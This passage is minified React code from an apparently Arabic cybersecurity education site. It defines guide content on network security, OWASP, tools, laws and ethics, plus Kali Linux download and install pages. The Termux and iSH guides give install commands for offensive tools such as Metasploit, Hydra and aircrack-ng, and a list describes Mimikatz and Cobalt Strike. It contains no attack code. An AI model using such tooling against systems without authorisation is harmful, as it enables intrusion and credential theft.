                        "PKI (Public Key Infrastructure): بنية تحتية لإدارة المفاتيح",
                        "Key Management: توليد، تخزين، توزيع، إلغاء المفاتيح",
                        "Hardware Security Modules (HSM): أجهزة متخصصة لحماية المفاتيح",
                        "أهمية: أمان التشفير يعتمد على سرية وإدارة المفاتيح بشكل صحيح",
                    ],
                },
            ],
        },
        {
            icon: $r,
            title: "أمن الشبكات",
            description: "حماية الشبكات من التهديدات وأدوات المراقبة والحماية",
            subTopics: [
                {
                    title: "جدران الحماية (Firewalls)",
                    content: [
                        "Packet Filtering: فلترة حسب IP والمنافذ والبروتوكولات",
                        "Stateful Inspection: تتبع حالة الاتصالات وفحص السياق",
                        "Application Layer: فحص محتوى التطبيقات (Layer 7)",
                        "Next-Generation Firewall (NGFW): دمج IPS وDPI ومكافحة البرمجيات الخبيثة",
                        "Web Application Firewall (WAF): حماية تطبيقات الويب من SQLi وXSS",
                        "القواعد: Allow/Deny بناءً على المصدر والوجهة والمنفذ والبروتوكول",
                    ],
                },
                {
                    title: "أنظمة كشف ومنع التسلل",
                    content: [
                        "IDS (Intrusion Detection System): اكتشاف الأنشطة المشبوهة والتنبيه",
                        "IPS (Intrusion Prevention System): اكتشاف ومنع الهجمات تلقائياً",
                        "Signature-based: مقارنة مع أنماط هجمات معروفة",
                        "Anomaly-based: اكتشاف السلوك غير الطبيعي مقارنة بالخط الأساسي",
                        "Network-based (NIDS/NIPS): مراقبة حركة الشبكة",
                        "Host-based (HIDS/HIPS): مراقبة نظام تشغيل واحد",
                    ],
                },
                {
                    title: "تجزئة الشبكة (Network Segmentation)",
                    content: [
                        "VLANs: شبكات محلية افتراضية لفصل حركة المرور",
                        "DMZ: منطقة منزوعة السلاح للخوادم العامة",
                        "Air Gap: فصل كامل عن الإنترنت للأنظمة الحساسة",
                        "Micro-segmentation: تجزئة دقيقة على مستوى التطبيقات",
                        "Zero Trust: لا تثق بأي شيء داخل أو خارج الشبكة",
                        "الفائدة: تقليل نطاق الاختراق في حالة حدوثه",
                    ],
                },
                {
                    title: "VPN والاتصالات الآمنة",
                    content: [
                        "Site-to-Site VPN: ربط فروع المؤسسة بشكل آمن",
                        "Remote Access VPN: اتصال الموظفين عن بعد",
                        "بروتوكولات: OpenVPN، WireGuard، IPsec، L2TP",
                        "Split Tunneling: توجيه حركة معينة فقط عبر VPN",
                        "Always-On VPN: اتصال تلقائي دائم للأجهزة المؤسسية",
                        "الاعتبارات: السرعة، التشفير، الخصوصية، الموثوقية",
                    ],
                },
            ],
        },
        {
            icon: og,
            title: "أمن تطبيقات الويب",
            description: "OWASP Top 10 وأفضل الممارسات لتطوير تطبيقات آمنة",
            subTopics: [
                {
                    title: "OWASP Top 10 - 2021",
                    content: [
                        "A01 - Broken Access Control: الوصول لموارد غير مصرح بها",
                        "A02 - Cryptographic Failures: ضعف في التشفير وحماية البيانات",
                        "A03 - Injection: SQL، NoSQL، LDAP، OS injection",
                        "A04 - Insecure Design: ثغرات في التصميم من البداية",
                        "A05 - Security Misconfiguration: إعدادات افتراضية أو خاطئة",
                        "A06 - Vulnerable Components: استخدام مكتبات قديمة أو معرضة",
                        "A07 - Authentication Failures: ضعف في المصادقة وإدارة الجلسات",
                        "A08 - Data Integrity Failures: ضعف في التحقق من سلامة البيانات",
                        "A09 - Security Logging Failures: عدم كفاية التسجيل والمراقبة",
                        "A10 - SSRF: Server-Side Request Forgery",
                    ],
                },
                {
                    title: "التحقق من المدخلات (Input Validation)",
                    content: [
                        "Whitelist vs Blacklist: استخدم القوائم البيضاء كلما أمكن",
                        "Server-side Validation: لا تعتمد على التحقق في المتصفح فقط",
                        "Parameterized Queries: استخدم Prepared Statements دائماً",
                        "Output Encoding: ترميز المخرجات حسب السياق (HTML, JS, URL)",
                        "File Upload Validation: التحقق من النوع والحجم والمحتوى",
                        "Regular Expressions: استخدم regex دقيقة للتحقق من الصيغ",
                    ],
                },
                {
                    title: "إدارة الجلسات والمصادقة",
                    content: [
                        "Session ID: عشوائي وطويل بما يكفي (128-bit minimum)",
                        "HTTP-Only Cookies: منع JavaScript من الوصول للجلسة",
                        "Secure Flag: إرسال الكوكيز عبر HTTPS فقط",
                        "SameSite Attribute: حماية من CSRF",
                        "Session Timeout: انتهاء الجلسة بعد فترة عدم نشاط",
                        "MFA/2FA: المصادقة متعددة العوامل للحسابات الحساسة",
                    ],
                },
                {
                    title: "حماية APIs",
                    content: [
                        "Authentication: JWT، OAuth 2.0، API Keys",
                        "Rate Limiting: تحديد عدد الطلبات لمنع الإساءة",
                        "Input Validation: التحقق من جميع المدخلات والمعلمات",
                        "HTTPS Only: تشفير جميع الاتصالات",
                        "CORS Policy: تحديد المصادر المسموح لها بالوصول",
                        "API Versioning: إدارة الإصدارات وإلغاء القديم بأمان",
                    ],
                },
            ],
        },
        {
            icon: fr,
            title: "أنظمة التشغيل والأدوات",
            description: "تعرف على توزيعات لينكس للأمن السيبراني وأهم الأدوات",
            subTopics: [
                {
                    title: "توزيعات لينكس للأمن السيبراني",
                    content: [
                        "Kali Linux: الأشهر والأكثر استخداماً، +600 أداة مثبتة مسبقاً",
                        "Parrot Security OS: بديل خفيف مع تركيز على الخصوصية",
                        "BlackArch: مبني على Arch مع +2800 أداة",
                        "BackBox: مبني على Ubuntu، سهل الاستخدام",
                        "Pentoo: مبني على Gentoo للمتقدمين",
                        "نصيحة: ابدأ بـ Kali Linux لتوفر الدعم والتوثيق",
                    ],
                },
                {
                    title: "أدوات فحص الشبكات",
                    content: [
                        "Nmap: الأداة الأساسية لفحص المنافذ واكتشاف الخدمات",
                        "Masscan: أسرع ماسح منافذ، مناسب للشبكات الكبيرة",
                        "Zenmap: واجهة رسومية لـ Nmap",
                        "Angry IP Scanner: ماسح IP سريع وبسيط",
                        "Netcat: سكين الجيش السويسري للشبكات",
                        "Wireshark: تحليل حزم الشبكة بالتفصيل",
                    ],
                },
                {
                    title: "أدوات اختبار تطبيقات الويب",
                    content: [
                        "Burp Suite: الأداة الأساسية لاختبار تطبيقات الويب",
                        "OWASP ZAP: بديل مجاني ومفتوح المصدر",
                        "Nikto: فحص سريع لثغرات الخوادم",
                        "SQLMap: أتمتة اكتشاف واستغلال SQL Injection",
                        "Dirb/Gobuster: اكتشاف الملفات والمجلدات المخفية",
                        "WPScan: فحص ثغرات WordPress",
                    ],
                },
                {
                    title: "أدوات الاستغلال",
                    content: [
                        "Metasploit Framework: أشهر إطار عمل للاستغلال",
                        "Cobalt Strike: أداة تجارية متقدمة للفريق الأحمر",
                        "Empire: إطار عمل PowerShell للتحكم عن بعد",
                        "Mimikatz: استخراج كلمات المرور من ذاكرة Windows",
                        "Hashcat/John: كسر كلمات المرور والهاشات",
                        "Responder: هجمات LLMNR/NBT-NS في الشبكات المحلية",
                    ],
                },
            ],
        },
        {
            icon: fx,
            title: "القوانين والأخلاقيات",
            description: "الإطار القانوني والأخلاقي للعمل في الأمن السيبراني",
            subTopics: [
                {
                    title: "القوانين والتشريعات",
                    content: [
                        "الاختراق بدون إذن جريمة جنائية في جميع الدول تقريباً",
                        "Computer Fraud and Abuse Act (CFAA): القانون الأمريكي",
                        "Computer Misuse Act: القانون البريطاني",
                        "قوانين الجرائم الإلكترونية العربية: تختلف حسب الدولة",
                        "GDPR: حماية البيانات الشخصية في الاتحاد الأوروبي",
                        "العقوبات تتراوح من الغرامات المالية إلى السجن لسنوات",
                    ],
                },
                {
                    title: "أخلاقيات الهاكر الأخلاقي",
                    content: [
                        "احصل دائماً على إذن كتابي قبل أي اختبار",
                        "العمل ضمن النطاق المتفق عليه فقط",
                        "الإبلاغ عن جميع الثغرات المكتشفة للعميل",
                        "عدم الإضرار بالأنظمة أو البيانات",
                        "الحفاظ على سرية المعلومات المكتشفة",
                        "الإفصاح المسؤول (Responsible Disclosure) للثغرات",
                    ],
                },
                {
                    title: "برامج Bug Bounty",
                    content: [
                        "HackerOne: أكبر منصة لبرامج مكافآت الثغرات",
                        "Bugcrowd: منصة شائعة أخرى",
                        "Synack: منصة مغلقة للباحثين المختارين",
                        "Open Bug Bounty: للمواقع بدون برنامج رسمي",
                        "نصائح: اقرأ القواعد جيداً، ابدأ بالبرامج العامة",
                        "المكافآت تتراوح من $50 إلى $1,000,000+ للثغرات الحرجة",
                    ],
                },
                {
                    title: "الشهادات المهنية",
                    content: [
                        "CEH (Certified Ethical Hacker): شهادة أساسية شائعة",
                        "OSCP (Offensive Security Certified Professional): عملية ومحترمة",
                        "CISSP: للإدارة والاستراتيجية الأمنية",
                        "CompTIA Security+: شهادة أساسية ممتازة للمبتدئين",
                        "CISM/CISA: للحوكمة والتدقيق",
                        "نصيحة: الشهادات مهمة لكن الخبرة العملية أهم",
                    ],
                },
            ],
        },
    ],
    rk = () => {
        const [e, t] = x.useState(null),
            [n, r] = x.useState(null),
            o = (i) => {
                t(e === i ? null : i), r(null);
            },
            s = (i) => {
                r(n === i ? null : i);
            };
        return c.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                c.jsx(wr, {}),
                c.jsx("main", {
                    className: "pt-24 pb-16",
                    children: c.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            c.jsxs("div", {
                                className: "text-center mb-16",
                                children: [
                                    c.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: c.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: c.jsx(gc, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    c.jsx("h1", {
                                        className: "text-4xl md:text-5xl font-bold text-primary text-glow mb-4",
                                        children: "الدليل الكامل",
                                    }),
                                    c.jsxs("p", {
                                        className: "text-muted-foreground text-lg max-w-2xl mx-auto",
                                        children: [
                                            "دليلك الشامل   ",
                                            tf.length,
                                            " أقسام رئيسية مع شرح مفصل",
                                        ],
                                    }),
                                ],
                            }),
                            c.jsx("div", {
                                className: "max-w-5xl mx-auto space-y-4",
                                children: tf.map((i, a) =>
                                    c.jsxs(
                                        "div",
                                        {
                                            className: "cyber-card overflow-hidden",
                                            children: [
                                                c.jsxs("button", {
                                                    onClick: () => o(a),
                                                    className:
                                                        "w-full p-6 flex items-center justify-between hover:bg-primary/5 transition-colors",
                                                    children: [
                                                        c.jsxs("div", {
                                                            className: "flex items-center gap-4",
                                                            children: [
                                                                c.jsx("div", {
                                                                    className:
                                                                        "w-14 h-14 rounded-2xl bg-gradient-to-br from-primary/20 to-primary/5 border border-primary/30 flex items-center justify-center",
                                                                    children: c.jsx(i.icon, {
                                                                        className: "w-7 h-7 text-primary",
                                                                    }),
                                                                }),
                                                                c.jsxs("div", {
                                                                    className: "text-right",
                                                                    children: [
                                                                        c.jsx("h2", {
                                                                            className:
                                                                                "text-xl md:text-2xl font-bold text-primary",
                                                                            children: i.title,
                                                                        }),
                                                                        c.jsx("p", {
                                                                            className:
                                                                                "text-muted-foreground text-sm mt-1",
                                                                            children: i.description,
                                                                        }),
                                                                    ],
                                                                }),
                                                            ],
                                                        }),
                                                        c.jsxs("div", {
                                                            className: "flex items-center gap-3",
                                                            children: [
                                                                c.jsxs("span", {
                                                                    className:
                                                                        "hidden md:block px-3 py-1 rounded-full bg-primary/10 text-primary text-sm",
                                                                    children: [i.subTopics.length, " موضوع"],
                                                                }),
                                                                e === a
                                                                    ? c.jsx(Ki, { className: "w-6 h-6 text-primary" })
                                                                    : c.jsx(Wi, {
                                                                          className: "w-6 h-6 text-muted-foreground",
                                                                      }),
                                                            ],
                                                        }),
                                                    ],
                                                }),
                                                e === a &&
                                                    c.jsx("div", {
                                                        className:
                                                            "border-t border-border/30 p-4 space-y-3 animate-fade-in",
                                                        children: i.subTopics.map((l, u) => {
                                                            const d = `${a}-${u}`;
                                                            return c.jsxs(
                                                                "div",
                                                                {
                                                                    className:
                                                                        "rounded-xl bg-secondary/30 overflow-hidden",
                                                                    children: [
                                                                        c.jsxs("button", {
                                                                            onClick: () => s(d),
                                                                            className:
                                                                                "w-full p-4 flex items-center justify-between hover:bg-secondary/50 transition-colors",
                                                                            children: [
                                                                                c.jsxs("div", {
                                                                                    className:
                                                                                        "flex items-center gap-3",
                                                                                    children: [
                                                                                        c.jsx("span", {
                                                                                            className:
                                                                                                "w-8 h-8 rounded-lg bg-primary/20 text-primary flex items-center justify-center font-bold text-sm",
                                                                                            children: u + 1,
                                                                                        }),
                                                                                        c.jsx("h3", {
                                                                                            className:
                                                                                                "text-lg font-semibold text-foreground",
                                                                                            children: l.title,
                                                                                        }),
                                                                                    ],
                                                                                }),
                                                                                n === d
                                                                                    ? c.jsx(Ki, {
                                                                                          className:
                                                                                              "w-5 h-5 text-primary",
                                                                                      })
                                                                                    : c.jsx(Wi, {
                                                                                          className:
                                                                                              "w-5 h-5 text-muted-foreground",
                                                                                      }),
                                                                            ],
                                                                        }),
                                                                        n === d &&
                                                                            c.jsx("div", {
                                                                                className:
                                                                                    "px-4 pb-4 space-y-2 animate-fade-in",
                                                                                children: l.content.map((p, m) =>
                                                                                    c.jsxs(
                                                                                        "div",
                                                                                        {
                                                                                            className:
                                                                                                "flex items-start gap-3 p-3 rounded-lg bg-background/50",
                                                                                            children: [
                                                                                                c.jsx(Yv, {
                                                                                                    className:
                                                                                                        "w-5 h-5 text-primary flex-shrink-0 mt-0.5",
                                                                                                }),
                                                                                                c.jsx("p", {
                                                                                                    className:
                                                                                                        "text-muted-foreground leading-relaxed",
                                                                                                    children: p,
                                                                                                }),
                                                                                            ],
                                                                                        },
                                                                                        m
                                                                                    )
                                                                                ),
                                                                            }),
                                                                    ],
                                                                },
                                                                u
                                                            );
                                                        }),
                                                    }),
                                            ],
                                        },
                                        a
                                    )
                                ),
                            }),
                            c.jsx("div", {
                                className: "max-w-5xl mx-auto mt-12",
                                children: c.jsxs("div", {
                                    className: "cyber-card p-8",
                                    children: [
                                        c.jsx("h3", {
                                            className: "text-2xl font-bold text-primary mb-6 text-center",
                                            children: "نصائح ",
                                        }),
                                        c.jsxs("div", {
                                            className: "grid grid-cols-1 md:grid-cols-3 gap-6",
                                            children: [
                                                c.jsxs("div", {
                                                    className: "p-6 rounded-xl bg-secondary/30 text-center",
                                                    children: [
                                                        c.jsx("div", {
                                                            className:
                                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                                            children: c.jsx(gc, { className: "w-8 h-8 text-primary" }),
                                                        }),
                                                        c.jsx("h4", {
                                                            className: "text-lg font-bold text-foreground mb-2",
                                                            children: "تعلم الأساسيات",
                                                        }),
                                                        c.jsx("p", {
                                                            className: "text-muted-foreground text-sm",
                                                            children:
                                                               " ابدأ بتعلم الشبكات، لينكس، والبرمجة ",
                                                        }),
                                                    ],
                                                }),
                                                c.jsxs("div", {
                                                    className: "p-6 rounded-xl bg-secondary/30 text-center",
                                                    children: [
                                                        c.jsx("div", {
                                                            className:
                                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                                            children: c.jsx(ig, { className: "w-8 h-8 text-primary" }),
                                                        }),
                                                        c.jsx("h4", {
                                                            className: "text-lg font-bold text-foreground mb-2",
                                                            children: "تدرب باستمرار",
                                                        }),
                                                        c.jsx("p", {
                                                            className: "text-muted-foreground text-sm",
                                                            children:
                                                                "استخدم منصات مثل HackTheBox و TryHackMe للتدريب العملي",
                                                        }),
                                                    ],
                                                }),
                                                c.jsxs("div", {
                                                    className: "p-6 rounded-xl bg-secondary/30 text-center",
                                                    children: [
                                                        c.jsx("div", {
                                                            className:
                                                                "w-16 h-16 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center mx-auto mb-4",
                                                            children: c.jsx(fo, { className: "w-8 h-8 text-primary" }),
                                                        }),
                                                        c.jsx("h4", {
                                                            className: "text-lg font-bold text-foreground mb-2",
                                                            children: "كن أخلاقياً",
                                                        }),
                                                        c.jsx("p", {
                                                            className: "text-muted-foreground text-sm",
                                                            children:
                                                                "استخدم معرفتك لحماية الأنظمة واحترم القوانين دائماً",
                                                        }),
                                                    ],
                                                }),
                                            ],
                                        }),
                                    ],
                                }),
                            }),
                        ],
                    }),
                }),
                c.jsx(Sr, {}),
            ],
        });
    },
    vl = [
        {
            name: { ar: "Kali Linux ISO", en: "Kali Linux ISO" },
            description: { ar: "النسخة الكاملة للتثبيت على الجهاز", en: "Full version for PC installation" },
            icon: Yo,
            size: "3.5 GB",
            link: "https://www.kali.org/get-kali/#kali-installer-images",
            category: "desktop",
        },
        {
            name: { ar: "Kali Virtual Machine", en: "Kali Virtual Machine" },
            description: { ar: "للتشغيل على VMware أو VirtualBox", en: "For VMware or VirtualBox" },
            icon: sg,
            size: "3.2 GB",
            link: "https://www.kali.org/get-kali/#kali-virtual-machines",
            category: "desktop",
        },
        {
            name: { ar: "Kali NetHunter (Android)", en: "Kali NetHunter (Android)" },
            description: { ar: "نسخة للهواتف الأندرويد", en: "Android phone version" },
            icon: xc,
            size: "1.8 GB",
            link: "https://www.kali.org/get-kali/#kali-mobile",
            category: "mobile",
        },
        {
            name: { ar: "iSH Shell (iOS/iPhone)", en: "iSH Shell (iOS/iPhone)" },
            description: { ar: "محاكي لينكس للآيفون والآيباد", en: "Linux emulator for iPhone/iPad" },
            icon: xc,
            size: "50 MB",
            link: "https://apps.apple.com/app/ish-shell/id1436902243",
            category: "mobile",
        },
        {
            name: { ar: "Termux", en: "Termux" },
            description: { ar: "محاكي لينكس للأندرويد", en: "Linux emulator for Android" },
            icon: fr,
            size: "100 MB",
            link: "https://f-droid.org/packages/com.termux/",
            category: "termux",
        },
    ],
    ok = {
        desktop: {
            title: { ar: "تثبيت كالي لينكس على الكمبيوتر", en: "Install Kali Linux on PC" },
            steps: [
                {
                    title: { ar: "تحميل الملف", en: "Download file" },
                    description: {
                        ar: "قم بتحميل ملف ISO من الرابط أعلاه",
                        en: "Download the ISO file from the link above",
                    },
                },
                {
                    title: { ar: "إنشاء USB قابل للإقلاع", en: "Create bootable USB" },
                    description: {
                        ar: "استخدم برنامج Rufus أو Etcher لحرق الملف على USB",
                        en: "Use Rufus or Etcher to burn the file to USB",
                    },
                },
                {
                    title: { ar: "إعادة تشغيل الجهاز", en: "Restart computer" },
                    description: { ar: "أعد تشغيل جهازك واختر الإقلاع من USB", en: "Restart and boot from USB" },
                },
                {
                    title: { ar: "اتبع خطوات التثبيت", en: "Follow installation" },
                    description: {
                        ar: "اتبع التعليمات على الشاشة لإكمال التثبيت",
                        en: "Follow on-screen instructions to complete",
                    },
                },
                {
                    title: { ar: "إعداد المستخدم", en: "User setup" },
                    description: { ar: "أنشئ اسم مستخدم وكلمة مرور", en: "Create username and password" },
                },
                {
                    title: { ar: "تحديث النظام", en: "Update system" },
                    description: {
                        ar: "شغّل: sudo apt update && sudo apt upgrade",
                        en: "Run: sudo apt update && sudo apt upgrade",
                    },
                },
            ],
        },
        iphone: {
            title: { ar: "تثبيت أدوات الاختراق على iPhone", en: "Install Hacking Tools on iPhone" },
            steps: [
                {
                    title: { ar: "تحميل iSH Shell", en: "Download iSH Shell" },
                    description: {
                        ar: "حمّل التطبيق من App Store مجاناً",
                        en: "Download the app from App Store for free",
                    },
                },
                {
                    title: { ar: "فتح التطبيق", en: "Open the app" },
                    description: {
                        ar: "افتح iSH Shell وانتظر التحميل الأولي",
                        en: "Open iSH Shell and wait for initial setup",
                    },
                },
                {
                    title: { ar: "تحديث الحزم", en: "Update packages" },
                    description: { ar: "شغّل: apk update && apk upgrade", en: "Run: apk update && apk upgrade" },
                },
                {
                    title: { ar: "تثبيت Python", en: "Install Python" },
                    description: {
                        ar: "شغّل: apk add python3 python3-dev py3-pip",
                        en: "Run: apk add python3 python3-dev py3-pip",
                    },
                },
                {
                    title: { ar: "تثبيت أدوات الشبكة", en: "Install network tools" },
                    description: { ar: "شغّل: apk add nmap curl wget git", en: "Run: apk add nmap curl wget git" },
                },
                {
                    title: { ar: "تثبيت أدوات إضافية", en: "Install more tools" },
                    description: {
                        ar: "شغّل: pip3 install requests beautifulsoup4",
                        en: "Run: pip3 install requests beautifulsoup4",
                    },
                },
                {
                    title: { ar: "اختبار الأدوات", en: "Test tools" },
                    description: {
                        ar: "جرب: nmap --version و python3 --version",
                        en: "Try: nmap --version and python3 --version",
                    },
                },
            ],
        },
        termux: {
            title: { ar: "تثبيت أدوات الاختراق على Termux", en: "Install Hacking Tools on Termux" },
            steps: [
                {
                    title: { ar: "تحميل Termux", en: "Download Termux" },
                    description: {
                        ar: "حمّل من F-Droid (لا تستخدم Play Store)",
                        en: "Download from F-Droid (not Play Store)",
                    },
                },
                {
                    title: { ar: "منح الصلاحيات", en: "Grant permissions" },
                    description: {
                        ar: "شغّل: termux-setup-storage للوصول للملفات",
                        en: "Run: termux-setup-storage for file access",
                    },
                },
                {
                    title: { ar: "تحديث الحزم", en: "Update packages" },
                    description: { ar: "شغّل: pkg update && pkg upgrade", en: "Run: pkg update && pkg upgrade" },
                },
                {
                    title: { ar: "تثبيت الأساسيات", en: "Install basics" },
                    description: {
                        ar: "شغّل: pkg install python git curl wget nmap",
                        en: "Run: pkg install python git curl wget nmap",
                    },
                },
                {
                    title: { ar: "تثبيت Metasploit", en: "Install Metasploit" },
                    description: {
                        ar: "شغّل: pkg install unstable-repo && pkg install metasploit",
                        en: "Run: pkg install unstable-repo && pkg install metasploit",
                    },
                },
                {
                    title: { ar: "تثبيت SQLMap", en: "Install SQLMap" },
                    description: { ar: "شغّل: pip install sqlmap", en: "Run: pip install sqlmap" },
                },
                {
                    title: { ar: "تثبيت Hydra", en: "Install Hydra" },
                    description: { ar: "شغّل: pkg install hydra", en: "Run: pkg install hydra" },
                },
                {
                    title: { ar: "تثبيت أدوات WiFi", en: "Install WiFi tools" },
                    description: {
                        ar: "شغّل: pkg install aircrack-ng (يحتاج root)",
                        en: "Run: pkg install aircrack-ng (needs root)",
                    },
                },
                {
                    title: { ar: "استنساخ أدوات GitHub", en: "Clone GitHub tools" },
                    description: { ar: "شغّل: git clone [رابط الأداة]", en: "Run: git clone [tool URL]" },
                },
                {
                    title: { ar: "إنشاء alias", en: "Create alias" },
                    description: { ar: "أضف اختصارات في ~/.bashrc", en: "Add shortcuts to ~/.bashrc" },
                },
            ],
        },
    },
    sk = () => {
        const [e, t] = x.useState("desktop"),
            [n, r] = x.useState("ar"),
            o = {
                title: n === "ar" ? "  تنزيل كالي لينكس" : "Download  kali linux",
                subtitle:
                    n === "ar"
                        ? "روابط تنزيل مباشرة"
                        : "Direct download links",
                desktopSection: n === "ar" ? "للكمبيوتر" : "For PC",
                mobileSection: n === "ar" ? "للهواتف" : "For Mobile",
                termuxSection: n === "ar" ? "Termux (أندرويد)" : "Termux (Android)",
                installGuides: n === "ar" ? "دليل التثبيت" : "Installation Guides",
            },
            s = vl.filter((l) => l.category === "desktop"),
            i = vl.filter((l) => l.category === "mobile"),
            a = vl.filter((l) => l.category === "termux");
        return c.jsxs("div", {
            className: "min-h-screen bg-background",
            children: [
                c.jsx(wr, {}),
                c.jsx("main", {
                    className: "pt-24 pb-16",
                    children: c.jsxs("div", {
                        className: "container mx-auto px-4",
                        children: [
                            c.jsxs("div", {
                                className: "text-center mb-12",
                                children: [
                                    c.jsx("div", {
                                        className: "flex justify-center mb-6",
                                        children: c.jsx("div", {
                                            className: "cyber-icon-box",
                                            children: c.jsx(Qi, { className: "w-10 h-10 text-primary" }),
                                        }),
                                    }),
                                    c.jsxs("div", {
                                        className: "flex items-center justify-center gap-3 mb-4",
                                        children: [
                                            c.jsx("h1", {
                                                className: "text-4xl md:text-5xl font-bold text-primary text-glow",
                                                children: o.title,
                                            }),
                                            c.jsx("button", {
                                                onClick: () => r((l) => (l === "ar" ? "en" : "ar")),
                                                className:
                                                    "p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors",
                                                children: c.jsx(Rs, { className: "w-5 h-5 text-muted-foreground" }),
                                            }),
                                        ],
                                    }),
                                    c.jsx("p", {
                                        className: "text-muted-foreground text-lg max-w-2xl mx-auto",
                                        children: o.subtitle,
                                    }),
                                ],
                            }),
                            c.jsxs("div", {
                                className: "max-w-5xl mx-auto mb-12",
                                children: [
                                    c.jsxs("h2", {
                                        className: "text-2xl font-bold text-primary mb-6 flex items-center gap-3",
                                        children: [c.jsx(Yo, { className: "w-6 h-6" }), o.desktopSection],
                                    }),
                                    c.jsx("div", {
                                        className: "grid grid-cols-1 md:grid-cols-2 gap-6",
                                        children: s.map((l, u) =>
                                            c.jsx(
                                                "a",
                                                {
                                                    href: l.link,
                                                    target: "_blank",
                                                    rel: "noopener noreferrer",
                                                    className:
                                                        "cyber-card p-6 group hover:border-primary/50 transition-all",
                                                    children: c.jsxs("div", {
                                                        className: "flex items-start gap-4",
                                                        children: [
                                                            c.jsx("div", {
                                                                className:
                                                                    "w-14 h-14 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center group-hover:box-glow-sm transition-all",
                                                                children: c.jsx(l.icon, {
                                                                    className: "w-7 h-7 text-primary",
                                                                }),
                                                            }),
                                                            c.jsxs("div", {
                                                                className: "flex-1",
                                                                children: [
                                                                    c.jsx("h3", {
                                                                        className:
                                                                            "text-xl font-bold text-primary mb-1",
                                                                        children: n === "ar" ? l.name.ar : l.name.en,
                                                                    }),
                                                                    c.jsx("p", {
                                                                        className: "text-muted-foreground text-sm mb-2",
                                                                        children:
                                                                            n === "ar"
                                                                                ? l.description.ar
                                                                                : l.description.en,
                                                                    }),
                                                                    c.jsxs("div", {
                                                                        className:
                                                                            "flex items-center gap-2 text-muted-foreground text-sm",
                                                                        children: [
                                                                            c.jsx("span", { children: l.size }),
                                                                            c.jsx(ul, { className: "w-4 h-4" }),
                                                                        ],
                                                                    }),
                                                                ],
                                                            }),
                                                        ],
                                                    }),
                                                },
                                                u
                                            )
                                        ),
                                    }),
                                ],
                            }),
                            c.jsxs("div", {
                                className: "max-w-5xl mx-auto mb-12",
                                children: [
                                    c.jsxs("h2", {
                                        className: "text-2xl font-bold text-primary mb-6 flex items-center gap-3",
                                        children: [c.jsx(xc, { className: "w-6 h-6" }), o.mobileSection],
                                    }),
                                    c.jsx("div", {
                                        className: "grid grid-cols-1 md:grid-cols-2 gap-6",
                                        children: i.map((l, u) =>
                                            c.jsx(
                                                "a",
                                                {
                                                    href: l.link,
                                                    target: "_blank",
                                                    rel: "noopener noreferrer",
                                                    className:
                                                        "cyber-card p-6 group hover:border-primary/50 transition-all",
                                                    children: c.jsxs("div", {
                                                        className: "flex items-start gap-4",
                                                        children: [
                                                            c.jsx("div", {
                                                                className:
                                                                    "w-14 h-14 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center group-hover:box-glow-sm transition-all",
                                                                children: c.jsx(l.icon, {
                                                                    className: "w-7 h-7 text-primary",
                                                                }),
                                                            }),
                                                            c.jsxs("div", {
                                                                className: "flex-1",
                                                                children: [
                                                                    c.jsx("h3", {
                                                                        className:
                                                                            "text-xl font-bold text-primary mb-1",
                                                                        children: n === "ar" ? l.name.ar : l.name.en,
                                                                    }),
                                                                    c.jsx("p", {
                                                                        className: "text-muted-foreground text-sm mb-2",
                                                                        children:
                                                                            n === "ar"
                                                                                ? l.description.ar
                                                                                : l.description.en,
                                                                    }),
                                                                    c.jsxs("div", {
                                                                        className:
                                                                            "flex items-center gap-2 text-muted-foreground text-sm",
                                                                        children: [
                                                                            c.jsx("span", { children: l.size }),
                                                                            c.jsx(ul, { className: "w-4 h-4" }),
                                                                        ],
                                                                    }),
                                                                ],
                                                            }),
                                                        ],
                                                    }),
                                                },
                                                u
                                            )
                                        ),
                                    }),
                                ],
                            }),
                            c.jsxs("div", {
                                className: "max-w-5xl mx-auto mb-16",
                                children: [
                                    c.jsxs("h2", {
                                        className: "text-2xl font-bold text-primary mb-6 flex items-center gap-3",
                                        children: [c.jsx(fr, { className: "w-6 h-6" }), o.termuxSection],
                                    }),
                                    c.jsx("div", {
                                        className: "grid grid-cols-1 gap-6",
                                        children: a.map((l, u) =>
                                            c.jsx(
                                                "a",
                                                {
                                                    href: l.link,
                                                    target: "_blank",
                                                    rel: "noopener noreferrer",
                                                    className:
                                                        "cyber-card p-6 group hover:border-primary/50 transition-all",
                                                    children: c.jsxs("div", {
                                                        className: "flex items-start gap-4",
                                                        children: [
                                                            c.jsx("div", {
                                                                className:
                                                                    "w-14 h-14 rounded-2xl bg-primary/10 border border-primary/30 flex items-center justify-center group-hover:box-glow-sm transition-all",
                                                                children: c.jsx(l.icon, {
                                                                    className: "w-7 h-7 text-primary",
                                                                }),
                                                            }),
                                                            c.jsxs("div", {
                                                                className: "flex-1",
                                                                children: [
                                                                    c.jsx("h3", {
                                                                        className:
                                                                            "text-xl font-bold text-primary mb-1",
                                                                        children: n === "ar" ? l.name.ar : l.name.en,
                                                                    }),
                                                                    c.jsx("p", {
                                                                        className: "text-muted-foreground text-sm mb-2",
                                                                        children:
                                                                            n === "ar"
                                                                                ? l.description.ar
                                                                                : l.description.en,
                                                                    }),
                                                                    c.jsxs("div", {
                                                                        className:
                                                                            "flex items-center gap-2 text-muted-foreground text-sm",
                                                                        children: [
                                                                            c.jsx("span", { children: l.size }),
                                                                            c.jsx(ul, { className: "w-4 h-4" }),
                                                                        ],
                                                                    }),
                                                                ],
                                                            }),
                                                        ],
                                                    }),
                                                },
                                                u
                                            )
                                        ),
                                    }),
                                ],
                            }),
                            c.jsxs("div", {
                                className: "max-w-5xl mx-auto",
                                children: [
                                    c.jsx("h2", {
                                        className: "text-2xl font-bold text-primary mb-8 text-center",
                                        children: o.installGuides,
                                    }),
                                    c.jsx("div", {
                                        className: "space-y-4",
                                        children: Object.entries(ok).map(([l, u]) =>
                                            c.jsxs(
                                                "div",
                                                {
                                                    className: "cyber-card overflow-hidden",
                                                    children: [
                                                        c.jsxs("button", {
